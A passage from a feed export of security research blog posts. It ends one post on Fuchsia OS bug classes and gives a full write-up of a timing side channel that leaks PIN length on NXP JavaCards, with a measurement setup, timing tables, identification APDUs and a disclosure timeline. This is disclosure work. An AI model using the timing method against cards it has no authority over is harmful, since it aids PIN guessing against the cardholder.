class=\"simple\"> \n   <li>Divisions by zero in USB drivers, which would only kill the USB user process with no effect on the kernel and components;</li> \n   <li>kernel stack info leaks caused by lack of initialization on structures copied to userland, which are actually mitigated by <a class=\"reference external\" href=\"https://reviews.llvm.org/D54604\">AutoVarInit</a>, a compiler feature that initializes buffers automatically;</li> \n   <li>out-of-bounds accesses in the Bluetooth stack, which are mitigated by sanity checks within <tt class=\"docutils literal\">C++</tt> methods and operators; and</li> \n   <li>bluetooth DoSes where an attacker could use up the component's memory, but again without affecting the kernel.</li> \n  </ul> \n </div> \n</div> \n<div class=\"section\" id=\"conclusion\"> \n <h2>Conclusion</h2> \n <p>Overall, Fuchsia exhibits interesting security properties compared to other OSes such as Android.</p> \n <p>A few days of vulnerability research allowed us to conclude that the common programming bugs found in other OSes can also be found in Fuchsia. However, while these bugs can often be considered as vulnerabilities in other OSes, they turn out to be uninteresting on Fuchsia, because their impact is, for the most part, mitigated by Fuchsia's security properties.</p> \n <p>We note however that these security properties do not - and in fact, cannot - hold in the lowest layers of the kernel related to virtualization, exception handling and scheduling, and that any bug here remains exploitable just like on any other OS.</p> \n <p>All the bugs we found were reported to Google, and are now fixed.</p> \n <p>Again, it is not clear where Fuchsia is heading, and whether it is just a research OS as Google claims or a real OS that is vowed to be used on future products. What's clear, though, is that it has the potential to significantly increase the difficulty for attackers to compromise devices.</p> \n</div>","descriptionType":"html","publishedDate":"Mon, 08 Jun 2020 22:00:00 +0000","feedId":11110,"bgimg":"http://blog.quarkslab.com/resources/2020-05-20_playing-around-with-the-fuchsia-operating-system/images/monolithic.png","linkMd5":"49a8fa1929e7094fabb72d5aefec1af8","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx31/cdn65@2020_6/2020/08/25/01-15-09-174_c9a128020bf8fedc.webp","destWidth":721,"destHeight":351,"sourceBytes":47757,"destBytes":20376,"author":"706a5669981f47b5fce062bd6bd6e6a3","articleImgCdnMap":{"http://blog.quarkslab.com/resources/2020-05-20_playing-around-with-the-fuchsia-operating-system/images/monolithic.png":"https://cdn.jsdelivr.net/gh/myreaderx31/cdn65@2020_6/2020/08/25/01-15-09-174_c9a128020bf8fedc.webp","http://blog.quarkslab.com/resources/2020-05-20_playing-around-with-the-fuchsia-operating-system/images/micro.png":"https://cdn.jsdelivr.net/gh/myreaderx3/cdn32@2020_1/2020/08/25/01-15-12-513_9e8663734be29184.webp","http://blog.quarkslab.com/resources/2020-05-20_playing-around-with-the-fuchsia-operating-system/images/components.png":"https://cdn.jsdelivr.net/gh/myreaderx15/cdn77@2020_1/2020/08/25/01-15-15-986_88a95b66a6d49625.webp","http://blog.quarkslab.com/resources/2020-05-20_playing-around-with-the-fuchsia-operating-system/images/devhosts.png":"https://cdn.jsdelivr.net/gh/myreaderx1/cdn35@2020_5/2020/08/25/01-15-12-887_6449b99138e7fc54.webp","http://blog.quarkslab.com/resources/2020-05-20_playing-around-with-the-fuchsia-operating-system/images/panic.png":"https://cdn.jsdelivr.net/gh/myreaderx30/cdn36@2020_3/2020/08/25/01-15-15-142_c94d01d6fdc0f41e.webp"},"publishedOrCreatedDate":1598318092718},{"createdTime":"2020-08-25 09:14:52","updatedTime":"2020-08-25 09:14:52","title":"How a Security Anomaly was Accidentally Found in an EAL6+ JavaCard","link":"http://blog.quarkslab.com/how-a-security-anomaly-was-accidentally-found-in-an-eal6-javacard.html","description":"<style> .red {color:red} </style> \n<div class=\"section\" id=\"context\"> \n <h2>Context</h2> \n <p>Quarkslab is one of the 10 ITSEF (Information Technology Security Evaluation Facility, CESTI in French) licensed by the ANSSI's Centre de Certification National (CCN, French for National Certification Body) for performing CSPN (Certification de Sécurité de Premier Niveau, French for First Level Security Certification) evaluations in the software domain.</p> \n <p>My apologies for this stodgy introduction. Basically, we make from time to time official security evaluations and, to keep track of the ITSEFs performances, the ANSSI organizes every year an \"Inter-CESTI\" challenge. In this context, for the last challenge started in 2019, the ANSSI chose one of its own \"products\" to be evaluated, the open-source and open-hardware Wookey project <a class=\"footnote-reference\" href=\"http://blog.quarkslab.com/how-a-security-anomaly-was-accidentally-found-in-an-eal6-javacard.html#wookey\" id=\"id1\">[1]</a>, presented at SSTIC 2018 <a class=\"footnote-reference\" href=\"http://blog.quarkslab.com/how-a-security-anomaly-was-accidentally-found-in-an-eal6-javacard.html#sstic2018\" id=\"id2\">[2]</a>.</p> \n <p>The interesting point of this edition is that the barriers between the software and hardware domains were blurred to push ITSEFs out of their comfort zone. Test plans were established for each ITSEF to spread the load with a mix of software and hardware.</p> \n <p>By the way, methodologies and most interesting results will be presented at SSTIC 2020 <a class=\"footnote-reference\" href=\"http://blog.quarkslab.com/how-a-security-anomaly-was-accidentally-found-in-an-eal6-javacard.html#sstic2020\" id=\"id3\">[3]</a> in a joint work of the 10 ITSEFs and the ANSSI. We warmly invite you to at least have a look at the joint article which will be available in English.</p> \n <p>So, this is how we ended up with the <em>timing attack on UserPIN validation</em> item in our test plan.</p> \n <p>Clearly, at this point, the goal was not to ask a software ITSEF to perform a hardware attack in the hope of finding a vulnerability in a card already evaluated as Common Criteria EAL6+ <a class=\"footnote-reference\" href=\"http://blog.quarkslab.com/how-a-security-anomaly-was-accidentally-found-in-an-eal6-javacard.html#eal\" id=\"id4\">[4]</a> by some hardware ITSEF. The intention was only to make sure no trivial mistake was present in the Wookey applet and to see if we, software ITSEF, would be at ease to mount hardware attacks that don't require pricy hardware equipment.</p> \n</div> \n<div class=\"section\" id=\"userpin-validation\"> \n <h2>UserPIN validation</h2> \n <p>We won't cover the Wookey usage extensively, simply consider the Wookey as an embedded device with a touchscreen that you use to enter a PIN code validated by a JavaCard applet installed on a JavaCard inserted into the Wookey.</p> \n <p>A review of the Wookey applet source code showed that their <tt class=\"docutils literal\">check_pin</tt> method <a class=\"footnote-reference\" href=\"http://blog.quarkslab.com/how-a-security-anomaly-was-accidentally-found-in-an-eal6-javacard.html#checkpin\" id=\"id5\">[5]</a> properly uses the <tt class=\"docutils literal\">OwnerPIN.check</tt> JavaCard API function <a class=\"footnote-reference\" href=\"http://blog.quarkslab.com/how-a-security-anomaly-was-accidentally-found-in-an-eal6-javacard.html#ownerpin\" id=\"id6\">[6]</a> to validate a PIN. Even the length of the ISO7816 (APDU <a class=\"footnote-reference\" href=\"http://blog.quarkslab.com/how-a-security-anomaly-was-accidentally-found-in-an-eal6-javacard.html#apdu\" id=\"id7\">[7]</a>) command is kept constant for all supported PIN lengths so an attacker eavesdropping on the ISO7816 communication, encrypted in a <em>secure channel</em>, can't get any information.</p> \n <p>At this stage, there was no indication that a timing attack on UserPIN validation could be possible.</p> \n <p>Nevertheless, in the Inter-CESTI context of demonstrating that we, software ITSEF, are able to conduct low budget hardware attacks, we moved on to the practical aspects. As a first step, we modified the applet to test more easily PIN attempts without a need for mounting first a <em>secure channel</em>.</p> \n <p>The Wookey demonstration setups we got for the evaluation were using (arbitrarily) J3D081 NXP cards (featuring JCOP2.4.2R2 <a class=\"footnote-reference\" href=\"http://blog.quarkslab.com/how-a-security-anomaly-was-accidentally-found-in-an-eal6-javacard.html#jcop\" id=\"id8\">[8]</a>) but, when we wanted to conduct the experiments on the modified applet, we only had more recent J3R200 cards lying around (featuring a SmartMX3 P71D321 <a class=\"footnote-reference\" href=\"http://blog.quarkslab.com/how-a-security-anomaly-was-accidentally-found-in-an-eal6-javacard.html#p71d321\" id=\"id9\">[9]</a> with JCOP4). So we conducted the experiments on a J3R200, not that it should matter, right?</p> \n</div> \n<div class=\"section\" id=\"physical-setup\"> \n <h2>Physical setup</h2> \n <p>Conducting such experiments on contact cards doesn't require much hardware. You need an ISO7816 reader and a way to measure the response time precisely enough. Measuring response time on the host is not precise enough as USB schedules the transmission of packets in one millisecond time cycles or frames so we use a simple logic analyzer.</p> \n <p>ISO7816 communication is quite similar to an 8-bit UART with even parity and one stop bit, working at a baudrate depending on the frequency of the provided clock signal, and with one single I/O pad for both RX and TX.</p> \n <img alt=\"\" class=\"align-center\" src=\"http://blog.quarkslab.com/resources/2020-05-12-jcop-pinlength-timing-attack/iso7816.png\" style=\"width: 200px;\" /> \n <p>But actually you don't care about all these details, you just need to know where to tap on the I/O and to measure the response time of the card.</p> \n <p>Using an external analyzer requires to be able to access the I/O pin, which can be achieved either by combining cheap adapters to extend the physical connection out of the reader, or by directly tapping into the reader with some hardware modifications.</p> \n <img alt=\"\" class=\"align-center\" src=\"http://blog.quarkslab.com/resources/2020-05-12-jcop-pinlength-timing-attack/instrumented_reader_1024.jpg\" style=\"width: 400px;\" /> \n <img alt=\"\" class=\"align-center\" src=\"http://blog.quarkslab.com/resources/2020-05-12-jcop-pinlength-timing-attack/instrumented_reader2_1024.jpg\" style=\"width: 600px;\" /> \n <p>In our setup, we chose to connect a logic analyzer to the I/O and Ground pins of the card and we controlled both the logic analyzer and the card reader from a Python script. Indeed a Python module called <tt class=\"docutils literal\">saleae</tt> <a class=\"footnote-reference\" href=\"http://blog.quarkslab.com/how-a-security-anomaly-was-accidentally-found-in-an-eal6-javacard.html#pipsaleae\" id=\"id10\">[10]</a> is available to control its GUI <a class=\"footnote-reference\" href=\"http://blog.quarkslab.com/how-a-security-anomaly-was-accidentally-found-in-an-eal6-javacard.html#saleaesw\" id=\"id11\">[11]</a>. Maybe a similar setup could be achieved with the open-source Sigrok project <a class=\"footnote-reference\" href=\"http://blog.quarkslab.com/how-a-security-anomaly-was-accidentally-found-in-an-eal6-javacard.html#sigrok\" id=\"id12\">[12]</a>, we didn't explore that path.</p> \n <p>The script was very basic:</p> \n <ul class=\"simple\"> \n  <li>Connect to the card, get its ATR</li> \n  <li>Setup the card with a test PIN, e.g. 1234</li> \n  <li>Start a capture on the logic analyzer at 100 Ms/s</li> \n  <li>Send the APDU to check a PIN, e.g. 9999</li> \n  <li>Stop and save the capture</li> \n  <li>Extract timings from the capture and keep the first one which is <em>long enough</em> to be the response time (the other ones are the timings between individual bits)</li> \n </ul> \n <p>Here is an example of such capture.</p> \n <img alt=\"\" class=\"align-center\" src=\"http://blog.quarkslab.com/resources/2020-05-12-jcop-pinlength-timing-attack/capture.png\" style=\"width: 800px;\" /> \n</div> \n<div class=\"section\" id=\"testing\"> \n <h2>Testing</h2> \n <p>Firstly, we wanted to see if there was a timing difference depending on the PIN length. So we configured a 4-digit PIN (1234) and we tried to authenticate with a set of wrong PINs of various lengths (9, 99, 999, ...). We repeated the operations for 8-digit and 12-digit PINs.</p> \n <table border=\"1\" class=\"docutils\"> \n  <colgroup> \n   <col width=\"17%\" /> \n   <col width=\"27%\" /> \n   <col width=\"27%\" /> \n   <col width=\"28%\" /> \n  </colgroup> \n  <thead valign=\"bottom\"> \n   <tr> \n    <th class=\"head\"> \n     <!--  --> </th> \n    <th class=\"head\" colspan=\"3\">Response delay in ms</th> \n   </tr> \n   <tr> \n    <th class=\"head\">Tried PIN length</th> \n    <th class=\"head\">Configured PIN length = 4</th> \n    <th class=\"head\">Configured PIN length = 8</th> \n    <th class=\"head\">Configured PIN length = 12</th> \n   </tr> \n  </thead> \n  <tbody valign=\"top\"> \n   <tr> \n    <td>1</td> \n    <td>9.59842</td> \n    <td>9.61192</td> \n    <td>9.60721</td> \n   </tr> \n   <tr> \n    <td>2</td> \n    <td>9.61701</td> \n    <td>9.60351</td> \n    <td>9.61363</td> \n   </tr> \n   <tr> \n    <td>3</td> \n    <td>9.64341</td> \n    <td>9.64240</td> \n    <td>9.65246</td> \n   </tr> \n   <tr> \n    <td>4</td> \n    <td><span class=\"red\">9.70651</span></td> \n    <td>9.60401</td> \n    <td>9.61189</td> \n   </tr> \n   <tr> \n    <td>5</td> \n    <td>9.66192</td> \n    <td>9.64365</td> \n    <td>9.65071</td> \n   </tr> \n   <tr> \n    <td>6</td> \n    <td>9.64476</td> \n    <td>9.64452</td> \n    <td>9.64737</td> \n   </tr> \n   <tr> \n    <td>7</td> \n    <td>9.65265</td> \n    <td>9.64267</td> \n    <td>9.65846</td> \n   </tr> \n   <tr> \n    <td>8</td> \n    <td>9.59802</td> \n    <td><span class=\"red\">9.68900</span></td> \n    <td>9.59189</td> \n   </tr> \n   <tr> \n    <td>9</td> \n    <td>9.61667</td> \n    <td>9.61141</td> \n    <td>9.61171</td> \n   </tr> \n   <tr> \n    <td>10</td> \n    <td>9.61275</td> \n    <td>9.60951</td> \n    <td>9.61639</td> \n   </tr> \n   <tr> \n    <td>11</td> \n    <td>9.61390</td> \n    <td>9.60492</td> \n    <td>9.60722</td> \n   </tr> \n   <tr> \n    <td>12</td> \n    <td>9.61625</td> \n    <td>9.60976</td> \n    <td><span class=\"red\">9.70940</span></td> \n   </tr> \n   <tr> \n    <td>13</td> \n    <td>9.61140</td> \n    <td>9.60391</td> \n    <td>9.60423</td> \n   </tr> \n   <tr> \n    <td>14</td> \n    <td>9.60750</td> \n    <td>9.60726</td> \n    <td>9.60414</td> \n   </tr> \n   <tr> \n    <td>15</td> \n    <td>9.61616</td> \n    <td>9.61841</td> \n    <td>9.61573</td> \n   </tr> \n   <tr> \n    <td>correct PIN</td> \n    <td>12.15997</td> \n    <td>12.15688</td> \n    <td>12.15196</td> \n   </tr> \n  </tbody> \n </table> \n <div class=\"line-block\"> \n  <div class=\"line\"> \n   <br /> \n  </div> \n </div> \n <p>Repeated measures showed some jitter, nevertheless when a wrong PIN was tested <em>with the correct length</em>, the response delay was clearly standing out as the slowest one with one single measurement per tried PIN.</p> \n <p>So, if enough PIN attempts are allowed by an applet on such card, or if one can make one or two tests between usages by the legitimate owner, one could learn what the correct PIN length is.</p> \n <p>To follow the Wookey test plan, we then tested the same attack on the original applet and within the <em>secure channel</em>. Response time within the <em>secure channel</em> was much longer (about 153 ms) and jitter increased, still on average (we took 3 measures for each test and kept the <em>middle</em> one) there was still a timing difference when the right PIN length is used.</p> \n <p>The next step was to try different PINs of the correct length. Luckily we didn't notice any timing difference when e.g. the first or the last digit was correct. Therefore this timing attack allows only to recover the PIN length.</p> \n <p>Later, we also tried the timing measures on a few other cards, including the J3D081 as used in the Wookey prototype. We discovered the same issue on a J3H081 (JCOP3) with even a much more visible timing difference (16 ms vs. 22 ms). We tested a J3H145 (JCOP3) and the difference wasn't there at all. Older J3D081 and J3A081 seem fine too.</p> \n</div> \n<div class=\"section\" id=\"security-discussion-and-responsible-disclosure\"> \n <h2>Security discussion and responsible disclosure</h2> \n <p>These findings are quite strange on such high security products.</p> \n <p>Clearly, it shouldn't happen.</p> \n <p>Still, it's hardly a practical security issue: on most applications, the PIN length is already known by the context and most applications will tolerate a maximum of three attempts before locking the card. Bruteforces are anyway highly impractical even if e.g. up to 16 PIN tries are tolerated and knowing exactly the PIN length saves only 10% of the bruteforce space (no need to test PINs 0 to 99999 if we know the PIN is 6 digits).</p> \n <p>Nevertheless, we decided to contact NXP PSIRT (Product Security Incident Response Team) to discuss this anomaly prior to any publication.</p> \n <p>The discussion was open and they checked if it could have an impact on the Common Criteria certification. Their conclusion is that it is not. There is no requirement in the Security Target for the products that would be violated.</p> \n <p>Anyway, they agreed these cards shouldn't behave like they do and they'll fix it in future versions of their products.</p> \n</div> \n<div class=\"section\" id=\"jcop-identification\"> \n <h2>JCOP identification</h2> \n <p>We've seen that a J3H145 wasn't affected at all and a J3H081 was strongly affected, while both cards are supposed to differ only by the size. Similarly, initially NXP couldn't reproduce our findings on their J3R200. Actually, behind each generation (e.g. J3A, J3D, J3H, J3R) there are still quite some implementations.</p> \n <p>JCOP cards implement a proprietary <tt class=\"docutils literal\">IDENTIFY</tt> APDU to extract precise information such as EEPROM ID, Platform ID, Custom Mask ID etc. The command and its interpretation are easy to find on the Internet for the JCOP2.4.x generations (J3A, J3D) <a class=\"footnote-reference\" href=\"http://blog.quarkslab.com/how-a-security-anomaly-was-accidentally-found-in-an-eal6-javacard.html#identify24\" id=\"id13\">[13]</a> and were also part of the <tt class=\"docutils literal\">jcshell</tt> tool distributed with the Eclipse IDE. The JCOP proprietary IDENTIFY command APDU is <tt class=\"docutils literal\">00A4040009A000000167413000FF00</tt>.</p> \n <p>But JCOP3 and JCOP4 don't support this historical <tt class=\"docutils literal\">IDENTIFY</tt> APDU (they reply with a <tt class=\"docutils literal\">6A82</tt> <em>File not found</em>) and we were confused to orient NXP towards the exact model of J3R200 we were using.</p> \n <p>Apparently the IDENTIFY command and the answer changed since JCOP3, and after searching for a while on the Internet, we could find it in a public document from NXP used in its certification process, the <em>ChipDoc P60 on JCOP 3 SECID P60 (OSA) SSCD</em> <a class=\"footnote-reference\" href=\"http://blog.quarkslab.com/how-a-security-anomaly-was-accidentally-found-in-an-eal6-javacard.html#p60sscd\" id=\"id14\">[14]</a>.</p> \n <p>The much sought-after new IDENTIFY command is <tt class=\"docutils literal\">80CA00FE02DF2800</tt> and it returns a bunch of TLV-formatted data partly described in the document. May this information help some of you in the future.</p> \n <p>Testing it on our J3R200:</p> \n <pre class=\"code literal-block\">\n$ scriptor\nTrying T=1 protocol\nReading commands from STDIN\n80CA00FE02DF2800\n&gt; 80 CA 00 FE 02 DF 28 00\n&lt; FE 45 DF 28 42 01 0C 00 01 A1 C2 82 34 97 80 44\n93 39 CA 02 08 00 00 00 00 00 00 00 01 03 18 4A\n33 52 33 35 31 30 31 46 41 39 45 30 34 30 30 DD\n09 84 59 3B 00 48 EF 05 01 00 07 01 01 08 08 2E\n5A D8 84 09 C9 BA DB 90 00 : Normal processing.\n</pre> \n <p>Following the above-mentioned document to parse the answer, we learn that <em>Platform ID</em> is <tt class=\"docutils literal\">J3R35101FA9E0400</tt></p> \n <p>It's an EAL6+ chip, according to its <em>JCOP 4 P71 Certification Report</em> <a class=\"footnote-reference\" href=\"http://blog.quarkslab.com/how-a-security-anomaly-was-accidentally-found-in-an-eal6-javacard.html#p71report\" id=\"id15\">[15]</a> and the Platform ID corresponds apparently to a JCOP 4 P71 v4.7 R1.00.4.</p> \n <p>The other affected card, the J3H081, has as Platform ID <tt class=\"docutils literal\">JxHyyy00E4D80300</tt> while the J3H145 has as Platform ID <tt class=\"docutils literal\">JxHyyy0019790400</tt> which explains their JavaCard OS implementation was differing somehow.</p> \n</div> \n<div class=\"section\" id=\"conclusion\"> \n <h2>Conclusion</h2> \n <p>We've seen how one can easily tap into an ISO7816 communication to measure precisely the response times of a smart card. Such example of a very low budget hardware attack shows how the distinction between the historical software and hardware domains of ITSEFs tends to blur.</p> \n <p>Our tests revealed an information leakage on J3R200 and J3H081 JavaCards: a simple test of a few different PIN lengths allows to know the correct PIN length. Note that even if it shouldn't happen in such security product, this is hardly a practical security issue as the number of PIN attempts is typically very limited in real applications.</p> \n <p>It was also quite a turn of events: if we had executed the test plan with the initially foreseen J3D081, the tests would have failed as expected and we would never have tested other cards.</p> \n <p>So, don't be intimidated by high certifications of products and still try out stuff by yourself, who knows...</p> \n <p>The Inter-CESTI challenge on the Wookey was really fun to do on many aspects. Don't miss the joint talk <a class=\"footnote-reference\" href=\"http://blog.quarkslab.com/how-a-security-anomaly-was-accidentally-found-in-an-eal6-javacard.html#sstic2020\" id=\"id16\">[3]</a> at SSTIC 2020!</p> \n <p>Thanks to all our Quarkslab colleagues who proofread this article.</p> \n</div> \n<div class=\"section\" id=\"timeline\"> \n <h2>Timeline</h2> \n <ul class=\"simple\"> \n  <li>2020/03/16: =&gt; we alert NXP PSIRT about J3R200</li> \n  <li>2020/03/17: &lt;= NXP cannot reproduce, they ask for IDENTIFY info</li> \n  <li>2020/03/18: =&gt; we can only give partial info (CPLC)</li> \n  <li>2020/03/23: =&gt; we send our Wookey CSPN report (RTE) to ANSSI</li> \n  <li>2020/04/13: =&gt; we finally find how to IDENTIFY our J3R200 and we transmit the information to NXP</li> \n  <li>2020/04/14: =&gt; we test the J3H081 and we alert NXP on that one too</li> \n  <li>2020/04/16: &lt;=&gt; we have a call with NXP: they acknowledge the issue and ask some time to check the impact on certification</li> \n  <li>2020/05/04: &lt;= NXP allows us to publish</li> \n  <li>2020/05/05: =&gt; we share the status with ANSSI and ask for permission to cite the Inter-CESTI context</li> \n  <li>2020/05/11: &lt;= ANSSI allows us to mention the inter-CESTI challenge context for our results</li> \n </ul> \n</div> \n<div class=\"section\" id=\"references\"> \n <h2>References</h2> \n <table class=\"docutils footnote\" frame=\"void\" id=\"wookey\" rules=\"none\"> \n  <colgroup> \n   <col class=\"label\" /> \n   <col /> \n  </colgroup> \n  <tbody valign=\"top\"> \n   <tr> \n    <td class=\"label\"><a class=\"fn-backref\" href=\"http://blog.quarkslab.com/how-a-security-anomaly-was-accidentally-found-in-an-eal6-javacard.html#id1\">[1]</a></td> \n    <td><a class=\"reference external\" href=\"https://wookey-project.github.io/\">https://wookey-project.github.io/</a></td> \n   </tr> \n  </tbody> \n </table> \n <table class=\"docutils footnote\" frame=\"void\" id=\"sstic2018\" rules=\"none\"> \n  <colgroup> \n   <col class=\"label\" /> \n   <col /> \n  </colgroup> \n  <tbody valign=\"top\"> \n   <tr> \n    <td class=\"label\"><a class=\"fn-backref\" href=\"http://blog.quarkslab.com/how-a-security-anomaly-was-accidentally-found-in-an-eal6-javacard.html#id2\">[2]</a></td> \n    <td>Ryad Benadjila, Mathieu Renard, Philippe Trebuchet, Philippe Thierry, Arnauld Michelizza, and Jérémy Lefaure. <em>WooKey: USB Devices Strike Back</em> <a class=\"reference external\" href=\"https://www.sstic.org/2018/presentation/wookey_usb_devices_strike_back/\">https://www.sstic.org/2018/presentation/wookey_usb_devices_strike_back/</a></td> \n   </tr> \n  </tbody> \n </table> \n <table class=\"docutils footnote\" frame=\"void\" id=\"sstic2020\" rules=\"none\"> \n  <colgroup> \n   <col class=\"label\" /> \n   <col /> \n  </colgroup> \n  <tbody valign=\"top\"> \n   <tr> \n    <td class=\"label\">[3]</td> \n    <td><em>(<a class=\"fn-backref\" href=\"http://blog.quarkslab.com/how-a-security-anomaly-was-accidentally-found-in-an-eal6-javacard.html#id3\">1</a>, <a class=\"fn-backref\" href=\"http://blog.quarkslab.com/how-a-security-anomaly-was-accidentally-found-in-an-eal6-javacard.html#id16\">2</a>)</em> <em>Inter-CESTI: Methodological and Technical Feedbacks on Hardware Devices Evaluations</em> <a class=\"reference external\" href=\"https://www.sstic.org/2020/presentation/inter-cesti_methodological_and_technical_feedbacks_on_hardware_devices_evaluations/\">https://www.sstic.org/2020/presentation/inter-cesti_methodological_and_technical_feedbacks_on_hardware_devices_evaluations/</a></td> \n   </tr> \n  </tbody> \n </table> \n <table class=\"docutils footnote\" frame=\"void\" id=\"eal\" rules=\"none\"> \n  <colgroup> \n   <col class=\"label\" /> \n   <col /> \n  </colgroup> \n  <tbody valign=\"top\"> \n   <tr> \n    <td class=\"label\"><a class=\"fn-backref\" href=\"http://blog.quarkslab.com/how-a-security-anomaly-was-accidentally-found-in-an-eal6-javacard.html#id4\">[4]</a></td> \n    <td><a class=\"reference external\" href=\"https://en.wikipedia.org/wiki/Evaluation_Assurance_Level\">https://en.wikipedia.org/wiki/Evaluation_Assurance_Level</a></td> \n   </tr> \n  </tbody> \n </table> \n <table class=\"docutils footnote\" frame=\"void\" id=\"checkpin\" rules=\"none\"> \n  <colgroup> \n   <col class=\"label\" /> \n   <col /> \n  </colgroup> \n  <tbody valign=\"top\"> \n   <tr> \n    <td class=\"label\"><a class=\"fn-backref\" href=\"http://blog.quarkslab.com/how-a-security-anomaly-was-accidentally-found-in-an-eal6-javacard.html#id5\">[5]</a></td> \n    <td><a class=\"reference external\" href=\"https://github.com/wookey-project/javacard-applet/blob/master/src/wookey/common/WooKey.java#L171\">https://github.com/wookey-project/javacard-applet/blob/master/src/wookey/common/WooKey.java#L171</a></td> \n   </tr> \n  </tbody> \n </table> \n <table class=\"docutils footnote\" frame=\"void\" id=\"ownerpin\" rules=\"none\"> \n  <colgroup> \n   <col class=\"label\" /> \n   <col /> \n  </colgroup> \n  <tbody valign=\"top\"> \n   <tr> \n    <td class=\"label\"><a class=\"fn-backref\" href=\"http://blog.quarkslab.com/how-a-security-anomaly-was-accidentally-found-in-an-eal6-javacard.html#id6\">[6]</a></td> \n    <td><a class=\"reference external\" href=\"https://docs.oracle.com/javacard/3.0.5/api/javacard/framework/OwnerPIN.html\">https://docs.oracle.com/javacard/3.0.5/api/javacard/framework/OwnerPIN.html</a></td> \n   </tr> \n  </tbody> \n </table> \n <table class=\"docutils footnote\" frame=\"void\" id=\"apdu\" rules=\"none\"> \n  <colgroup> \n   <col class=\"label\" /> \n   <col /> \n  </colgroup> \n  <tbody valign=\"top\"> \n   <tr> \n    <td class=\"label\"><a class=\"fn-backref\" href=\"http://blog.quarkslab.com/how-a-security-anomaly-was-accidentally-found-in-an-eal6-javacard.html#id7\">[7]</a></td> \n    <td><a class=\"reference external\" href=\"https://en.wikipedia.org/wiki/Smart_card_application_protocol_data_unit\">https://en.wikipedia.org/wiki/Smart_card_application_protocol_data_unit</a></td> \n   </tr> \n  </tbody> \n </table> \n <table class=\"docutils footnote\" frame=\"void\" id=\"jcop\" rules=\"none\"> \n  <colgroup> \n   <col class=\"label\" /> \n   <col /> \n  </colgroup> \n  <tbody valign=\"top\"> \n   <tr> \n    <td class=\"label\"><a class=\"fn-backref\" href=\"http://blog.quarkslab.com/how-a-security-anomaly-was-accidentally-found-in-an-eal6-javacard.html#id8\">[8]</a></td> \n    <td><a class=\"reference external\" href=\"https://en.wikipedia.org/wiki/Java_Card_OpenPlatform\">https://en.wikipedia.org/wiki/Java_Card_OpenPlatform</a></td> \n   </tr> \n  </tbody> \n </table> \n <table class=\"docutils footnote\" frame=\"void\" id=\"p71d321\" rules=\"none\"> \n  <colgroup> \n   <col class=\"label\" /> \n   <col /> \n  </colgroup> \n  <tbody valign=\"top\"> \n   <tr> \n    <td class=\"label\"><a class=\"fn-backref\" href=\"http://blog.quarkslab.com/how-a-security-anomaly-was-accidentally-found-in-an-eal6-javacard.html#id9\">[9]</a></td> \n    <td><a class=\"reference external\" href=\"https://www.nxp.com/products/security-and-authentication/security-controllers/smartmx3-p71d321-secure-and-flexible-microcontroller:SMARTMX3-P71D321\">https://www.nxp.com/products/security-and-authentication/security-controllers/smartmx3-p71d321-secure-and-flexible-microcontroller:SMARTMX3-P71D321</a></td> \n   </tr> \n  </tbody> \n </table> \n <table class=\"docutils footnote\" frame=\"void\" id=\"pipsaleae\" rules=\"none\"> \n  <colgroup> \n   <col class=\"label\" /> \n   <col /> \n  </colgroup> \n  <tbody valign=\"top\"> \n   <tr> \n    <td class=\"label\"><a class=\"fn-backref\" href=\"http://blog.quarkslab.com/how-a-security-anomaly-was-accidentally-found-in-an-eal6-javacard.html#id10\">[10]</a></td> \n    <td><a class=\"reference external\" href=\"https://pypi.org/project/saleae/\">https://pypi.org/project/saleae/</a></td> \n   </tr> \n  </tbody> \n </table> \n <table class=\"docutils footnote\" frame=\"void\" id=\"saleaesw\" rules=\"none\"> \n  <colgroup> \n   <col class=\"label\" /> \n   <col /> \n  </colgroup> \n  <tbody valign=\"top\"> \n   <tr> \n    <td class=\"label\"><a class=\"fn-backref\" href=\"http://blog.quarkslab.com/how-a-security-anomaly-was-accidentally-found-in-an-eal6-javacard.html#id11\">[11]</a></td> \n    <td><a class=\"reference external\" href=\"https://www.saleae.com/downloads/\">https://www.saleae.com/downloads/</a></td> \n   </tr> \n  </tbody> \n </table> \n <table class=\"docutils footnote\" frame=\"void\" id=\"sigrok\" rules=\"none\"> \n  <colgroup> \n   <col class=\"label\" /> \n   <col /> \n  </colgroup> \n  <tbody valign=\"top\"> \n   <tr> \n    <td class=\"label\"><a class=\"fn-backref\" href=\"http://blog.quarkslab.com/how-a-security-anomaly-was-accidentally-found-in-an-eal6-javacard.html#id12\">[12]</a></td> \n    <td><a class=\"reference external\" href=\"https://sigrok.org/\">https://sigrok.org/</a></td> \n   </tr> \n  </tbody> \n </table> \n <table class=\"docutils footnote\" frame=\"void\" id=\"identify24\" rules=\"none\"> \n  <colgroup> \n   <col class=\"label\" /> \n   <col /> \n  </colgroup> \n  <tbody valign=\"top\"> \n   <tr> \n    <td class=\"label\"><a class=\"fn-backref\" href=\"http://blog.quarkslab.com/how-a-security-anomaly-was-accidentally-found-in-an-eal6-javacard.html#id13\">[13]</a></td> \n    <td><a class=\"reference external\" href=\"https://wiki.nfc.im/books/%E6%99%BA%E8%83%BD%E5%8D%A1%E6%89%8B%E5%86%8C/page/nxp-jcop-javacard\">https://wiki.nfc.im/books/%E6%99%BA%E8%83%BD%E5%8D%A1%E6%89%8B%E5%86%8C/page/nxp-jcop-javacard</a></td> \n   </tr> \n  </tbody> \n </table> \n <table class=\"docutils footnote\" frame=\"void\" id=\"p60sscd\" rules=\"none\"> \n  <colgroup> \n   <col class=\"label\" /> \n   <col /> \n  </colgroup> \n  <tbody valign=\"top\"> \n   <tr> \n    <td class=\"label\"><a class=\"fn-backref\" href=\"http://blog.quarkslab.com/how-a-security-anomaly-was-accidentally-found-in-an-eal6-javacard.html#id14\">[14]</a></td> \n    <td><a class=\"reference external\" href=\"https://www.ssi.gouv.fr/uploads/2017/09/anssi_cible2017_43en.pdf\">https://www.ssi.gouv.fr/uploads/2017/09/anssi_cible2017_43en.pdf</a></td> \n   </tr> \n  </tbody> \n </table> \n <table class=\"docutils footnote\" frame=\"void\" id=\"p71report\" rules=\"none\"> \n  <colgroup> \n   <col class=\"label\" /> \n   <col /> \n  </colgroup> \n  <tbody valign=\"top\"> \n   <tr> \n    <td class=\"label\"><a class=\"fn-backref\" href=\"http://blog.quarkslab.com/how-a-security-anomaly-was-accidentally-found-in-an-eal6-javacard.html#id15\">[15]</a></td> \n    <td><a class=\"reference external\" 